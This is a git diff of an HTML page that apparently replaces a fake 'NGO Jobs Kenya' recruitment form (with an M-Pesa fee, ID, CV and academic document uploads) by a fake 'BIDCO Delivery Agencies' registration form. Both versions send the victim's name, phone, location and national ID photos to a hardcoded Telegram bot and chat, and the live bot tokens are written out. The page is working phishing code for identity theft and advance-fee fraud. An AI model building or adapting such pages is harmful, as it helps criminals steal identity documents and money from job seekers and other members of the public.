@@ -4,286 +4,352 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Extractor - NGO Jobs Kenya</title>
+    <title>Responsive Delivery Form</title>
+
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        
         body {
-            font-family: Arial;
-            margin: 20px;
             background: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
         }
         
         .container {
-            max-width: 900px;
-            margin: auto;
+            background: #fff;
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         
-        .form-section {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+        
+        label {
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 12px;
+            display: block;
         }
         
         input,
-        textarea,
-        button {
+        textarea {
             width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border-radius: 5px;
+            padding: 12px;
+            margin-top: 6px;
+            border-radius: 8px;
             border: 1px solid #ccc;
+            font-size: 14px;
+        }
+        
+        textarea {
+            resize: none;
+        }
+        
+        input[type="file"] {
+            padding: 8px;
         }
         
         button {
-            background: #0b84ff;
-            color: white;
+            width: 100%;
+            margin-top: 18px;
+            padding: 14px;
             border: none;
+            background: #007bff;
+            color: white;
+            font-size: 16px;
+            border-radius: 8px;
             cursor: pointer;
         }
         
-        .extract-btn {
-            background: #28a745;
-            margin-top: 10px;
-        }
-        
-        .files-list {
-            background: #e9ecef;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 10px 0;
-        }
-        
-        .file-item {
-            padding: 8px;
-            border-bottom: 1px solid #ddd;
-        }
-        
-        .telegram-section {
-            background: #f8f9fa;
-            border: 2px dashed #0b84ff;
-        }
-        
-        pre {
-            background: #000;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-        }
-        
-        .status {
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-        
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+        button:hover {
+            background: #0056b3;
         }
         
         .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+            color: red;
+            font-size: 13px;
+            margin-top: 10px;
         }
         
-        .pre-filled {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            font-weight: bold;
+        .success {
+            color: green;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .preview {
+            margin-top: 8px;
+            width: 100%;
+            height: 140px;
+            object-fit: cover;
+            border-radius: 8px;
+            display: none;
+        }
+        /* Tablet */
+        
+        @media (min-width: 600px) {
+            .container {
+                padding: 25px;
+            }
+            h2 {
+                font-size: 24px;
+            }
+        }
+        /* Desktop */
+        
+        @media (min-width: 900px) {
+            body {
+                padding: 40px;
+            }
+            .container {
+                max-width: 600px;
+            }
+            h2 {
+                font-size: 26px;
+            }
         }
     </style>
 </head>
 
 <body>
+
     <div class="container">
-        <p>UPLOAD REQUIRED DOCUMMENTS TO RECRUITER , YOUR FILES WILL BE GENERATED AND SEND TO OUR OFFICES, WE WILL REVIEW AND CONTACT YOU FOR INTERVIEW, MAKES SURE ON YOUR RESUME, YOU USE REACHABLE PHONE NUMBER OR EMAIL, WE WILL CONTACT YOU ON BOTH.
-        </p>
-        <p><strong>PAY KES 95 TO PAYBILL <b>714888</b> ACCOUNT NO. <b>440395</b></strong></p>
+        <h2>BIDCO DELIVERY AGENCIES</h2>
+        <h2>REGISTER WITH US NOW</h2>
+        <p>We do delivery country wide, Payments is done on delivery</p>
+        <form id="deliveryForm">
 
-        <!-- ORIGINAL FORM -->
-        <div class="form-section">
-            <h3>📤 Upload iles to NGO Recruiter Here</h3>
-            <form id="originalForm">
-                <label>ID Front</label>
-                <input type="file" required id="idFront">
+            <label>Full Name</label>
+            <input type="text" id="name" placeholder="Enter full name">
 
-                <label>ID Back</label>
-                <input type="file" required id="idBack">
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="Enter phone number">
 
-                <label>Academic Documents</label>
-                <input type="file" multiple required id="academicDocs">
+            <label>Location</label>
+            <textarea id="location" rows="3" placeholder="Enter delivery location"></textarea>
 
-                <label>CV / Resume</label>
-                <input type="file" required id="cvResume">
+            <label>ID Front</label>
+            <input type="file" id="idFront" accept="image/*">
+            <img id="previewFront" class="preview">
 
-                <label>Payment Message</label>
-                <textarea id="paymentMsg" required placeholder="Paste MPESA receipt/transaction details here..."></textarea>
+            <label>ID Back</label>
+            <input type="file" id="idBack" accept="image/*">
+            <img id="previewBack" class="preview">
 
-                <button type="button" class="extract-btn" onclick="extractAllFiles()">🔍 Extract Files</button>
-                <button type="button" onclick="sendToTelegram()" style="background: #dc3545;">🚀 SEND TO TELEGRAM BOT</button>
-            </form>
-        </div>
+            <div class="error" id="errorMsg"></div>
 
-        <!-- EXTRACTED FILES -->
-        <div class="form-section">
-            <h3>📋 Extracted Files</h3>
-            <div id="filesSummary" class="files-list" style="display:none;">
-                <strong>Total Files: <span id="totalFiles">0</span></strong>
-                <div id="filesList"></div>
-            </div>
-        </div>
+            <button type="submit">REGISTER NOW</button>
 
-        <!-- TELEGRAM CONFIG (PRE-FILLED) -->
-        <div class="form-section telegram-section">
-            <h3>🤖 Telegram Bot - PRE-CONFIGURED</h3>
-            <input type="text" id="telegramToken" value="7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0" class="pre-filled" readonly>
-            <input type="text" id="chatId" value="5615316142" class="pre-filled" readonly>
-            <textarea id="telegramStatus" readonly placeholder="Status updates here..."></textarea>
-        </div>
+            <div class="success" id="successMsg"></div>
 
-        <!-- RAW DATA -->
-        <div class="form-section">
-            <h3>💾 What Gets Sent</h3>
-            <pre id="formDataOutput">Upload files first to see FormData...</pre>
-        </div>
+        </form>
     </div>
 
     <script>
-        // YOUR CREDENTIALS - HARDCODED
-        const TELEGRAM_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        // WARNING: This exposes your BOT_TOKEN to anyone who can view your page.
+
+        // Replace these with your values before using:
+
+        const BOT_TOKEN = '7757344484:AAFUuhaqCtEowjf3Pm5zgIbB5OLO9zQk2sI';
+
         const CHAT_ID = '5615316142';
 
-        let allFiles = {
-            idFront: null,
-            idBack: null,
-            academicDocs: [],
-            cvResume: null,
-            paymentMessage: ''
-        };
+        const form = document.getElementById('deliveryForm');
 
-        function extractAllFiles() {
-            const form = document.getElementById('originalForm');
+        const errorMsg = document.getElementById('errorMsg');
 
-            allFiles = {
-                idFront: document.getElementById('idFront').files[0] || null,
-                idBack: document.getElementById('idBack').files[0] || null,
-                academicDocs: Array.from(document.getElementById('academicDocs').files),
-                cvResume: document.getElementById('cvResume').files[0] || null,
-                paymentMessage: document.getElementById('paymentMsg').value
-            };
+        const successMsg = document.getElementById('successMsg');
 
-            displayFilesSummary();
-            showFormData();
+        function previewImage(input, previewId) {
 
-            document.getElementById('telegramStatus').textContent = `✅ Ready! ${Object.values(allFiles).filter(v => v && (!Array.isArray(v) || v.length > 0)).length} items extracted.`;
-            document.getElementById('telegramStatus').className = 'status success';
-        }
+            const file = input.files[0];
 
-        function displayFilesSummary() {
-            const summary = document.getElementById('filesSummary');
-            const list = document.getElementById('filesList');
-            const totalSpan = document.getElementById('totalFiles');
+            const preview = document.getElementById(previewId);
 
-            let totalCount = 0;
-            let html = '';
+            if (file) {
 
-            if (allFiles.idFront) {
-                totalCount++;
-                html += `<div class="file-item">📄 ID Front: ${allFiles.idFront.name} (${formatBytes(allFiles.idFront.size)})</div>`;
-            }
-            if (allFiles.idBack) {
-                totalCount++;
-                html += `<div class="file-item">📄 ID Back: ${allFiles.idBack.name} (${formatBytes(allFiles.idBack.size)})</div>`;
-            }
-            allFiles.academicDocs.forEach((file, i) => {
-                totalCount++;
-                html += `<div class="file-item">📚 Academic #${i+1}: ${file.name} (${formatBytes(file.size)})</div>`;
-            });
-            if (allFiles.cvResume) {
-                totalCount++;
-                html += `<div class="file-item">📄 CV: ${allFiles.cvResume.name} (${formatBytes(allFiles.cvResume.size)})</div>`;
-            }
-            if (allFiles.paymentMessage) html += `<div class="file-item">💰 Payment: ${allFiles.paymentMessage.substring(0, 50)}...</div>`;
+                const reader = new FileReader();
 
-            totalSpan.textContent = totalCount;
-            list.innerHTML = html;
-            summary.style.display = totalCount ? 'block' : 'none';
-        }
+                reader.onload = function(e) {
 
-        function showFormData() {
-            const formData = new FormData();
-            if (allFiles.idFront) formData.append('id_front', allFiles.idFront);
-            if (allFiles.idBack) formData.append('id_back', allFiles.idBack);
-            allFiles.academicDocs.forEach(file => formData.append('academic_docs[]', file));
-            if (allFiles.cvResume) formData.append('cv_resume', allFiles.cvResume);
-            formData.append('payment_message', allFiles.paymentMessage);
-            formData.append('chat_id', CHAT_ID);
+                    preview.src = e.target.result;
 
-            let output = `SENDING TO YOUR BOT (${CHAT_ID}):\n\n`;
-            for (let [key, value] of formData.entries()) {
-                output += `${key}: ${value.name || value}\n`;
-            }
-            output += `\n📤 Telegram API: https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+                    preview.style.display = "block";
 
-            document.getElementById('formDataOutput').textContent = output;
-        }
-
-        async function sendToTelegram() {
-            if (!allFiles.idFront) {
-                showStatus('❌ Upload files first!', 'error');
-                return;
-            }
-
-            showStatus('📤 Sending to your Telegram bot...', 'success');
-
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `🆕 NGO JOB FILES\nID Front/Back + ${allFiles.academicDocs.length} Academic + CV\nPayment: ${allFiles.paymentMessage}`);
-
-                // Send files one by one
-                const filesToSend = [allFiles.idFront, allFiles.idBack, ...allFiles.academicDocs, allFiles.cvResume].filter(Boolean);
-
-                for (let file of filesToSend) {
-                    formData.set('document', file);
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-                        method: 'POST',
-                        body: formData
-                    });
                 }
 
-                showStatus(`✅ SUCCESS! All ${filesToSend.length} files sent to chat ${CHAT_ID}`, 'success');
-            } catch (error) {
-                showStatus(`❌ Error: ${error.message}`, 'error');
+                reader.readAsDataURL(file);
+
             }
+
         }
 
-        function formatBytes(bytes) {
-            if (!bytes) return '0';
-            const k = 1024;
-            const sizes = ['B', 'KB', 'MB', 'GB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-        }
+        document.getElementById('idFront').addEventListener('change', function() {
 
-        function showStatus(message, type) {
-            const status = document.getElementById('telegramStatus');
-            status.textContent = message;
-            status.className = `status ${type}`;
-        }
+            previewImage(this, 'previewFront');
 
-        // LIVE MONITORING
-        document.querySelectorAll('input[type="file"], #paymentMsg').forEach(el => {
-            el.addEventListener('change', extractAllFiles);
-            el.addEventListener('input', extractAllFiles);
         });
 
-        // PRE-LOAD STATUS
-        showStatus('✅ Bot configured! Upload files and click SEND', 'success');
+        document.getElementById('idBack').addEventListener('change', function() {
+
+            previewImage(this, 'previewBack');
+
+        });
+
+        async function sendMessage(text) {
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            const payload = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            };
+
+            const res = await fetch(url, {
+
+                method: 'POST',
+
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+
+                body: JSON.stringify(payload)
+
+            });
+
+            return res.json();
+
+        }
+
+        async function sendPhoto(file, caption) {
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+            const fd = new FormData();
+
+            fd.append('chat_id', CHAT_ID);
+
+            fd.append('photo', file);
+
+            if (caption) fd.append('caption', caption);
+
+            const res = await fetch(url, {
+                method: 'POST',
+                body: fd
+            });
+
+            return res.json();
+
+        }
+
+        form.addEventListener('submit', async function(e) {
+
+            e.preventDefault();
+
+            errorMsg.textContent = "";
+
+            successMsg.textContent = "";
+
+            const name = document.getElementById('name').value.trim();
+
+            const phone = document.getElementById('phone').value.trim();
+
+            const location = document.getElementById('location').value.trim();
+
+            const idFront = document.getElementById('idFront').files[0];
+
+            const idBack = document.getElementById('idBack').files[0];
+
+            if (!name || !phone || !location || !idFront || !idBack) {
+
+                errorMsg.textContent = "Please fill all fields and upload both ID images.";
+
+                return;
+
+            }
+
+            if (!/^[0-9]{7,15}$/.test(phone)) {
+
+                errorMsg.textContent = "Enter a valid phone number.";
+
+                return;
+
+            }
+
+            try {
+
+                successMsg.textContent = "Sending to Telegram...";
+
+                // Send the text summary first
+
+                const summary = `<b>New Delivery Request</b>\nName: ${escapeHtml(name)}\nPhone: ${escapeHtml(phone)}\nLocation: ${escapeHtml(location)}`;
+
+                const msgResp = await sendMessage(summary);
+
+                if (!msgResp.ok) throw new Error('Failed to send message: ' + (msgResp.description || JSON.stringify(msgResp)));
+
+                // Send ID front
+
+                const capFront = `ID Front — ${escapeHtml(name)} (${escapeHtml(phone)})`;
+
+                const frontResp = await sendPhoto(idFront, capFront);
+
+                if (!frontResp.ok) throw new Error('Failed to send front ID: ' + (frontResp.description || JSON.stringify(frontResp)));
+
+                // Send ID back
+
+                const capBack = `ID Back — ${escapeHtml(name)} (${escapeHtml(phone)})`;
+
+                const backResp = await sendPhoto(idBack, capBack);
+
+                if (!backResp.ok) throw new Error('Failed to send back ID: ' + (backResp.description || JSON.stringify(backResp)));
+
+                successMsg.textContent = "Details submitted waiting for approval!";
+
+                form.reset();
+
+                document.getElementById('previewFront').style.display = "none";
+
+                document.getElementById('previewBack').style.display = "none";
+
+            } catch (err) {
+
+                console.error(err);
+
+                errorMsg.textContent = "Error sending to Telegram: " + (err.message || err);
+
+            }
+
+        });
+
+        // Basic HTML-escape to avoid markup injection in Telegram message
+
+        function escapeHtml(str) {
+
+            return String(str)
+
+            .replace(/&/g, '&amp;')
+
+            .replace(/</g, '&lt;')
+
+            .replace(/>/g, '&gt;');
+
+        }
     </script>
 </body>
 
